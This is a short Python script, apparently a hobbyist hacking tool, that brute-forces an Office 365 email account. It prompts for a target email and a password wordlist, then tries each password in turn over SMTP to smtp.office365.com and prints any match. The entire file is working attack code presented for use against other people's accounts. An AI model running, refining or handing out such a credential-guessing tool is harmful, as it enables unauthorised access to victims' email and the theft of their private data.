print '+++++++++++++++++++++++++++++++++++++++++-'
print '|                                        |'
print '|       [-] created by yazeed33 [-]      |'
print '|                                        |'
print '|+++++++++++++++++++++++++++++++++++++++++'

import smtplib
from os import system

print("[1] start attack")
print("[2] exit")
options = input("==> ")

if options == 1:
   pass_file = raw_input("path of wordlist file: ")

else:
 system('clear')
 exit()

smtpserver = smtplib.SMTP("smtp.office365.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input('Enter target Email: ')
pass_file = open(pass_file, 'r')

for password in pass_file:
    try:
        smtpserver.login(user, password)
        print("[+] PASS FOUND ------> " + password )
        break;
    except smtplib.SMTPAuthenticationError:
        print('[-] PASS INCORRECT ------> ' + password )

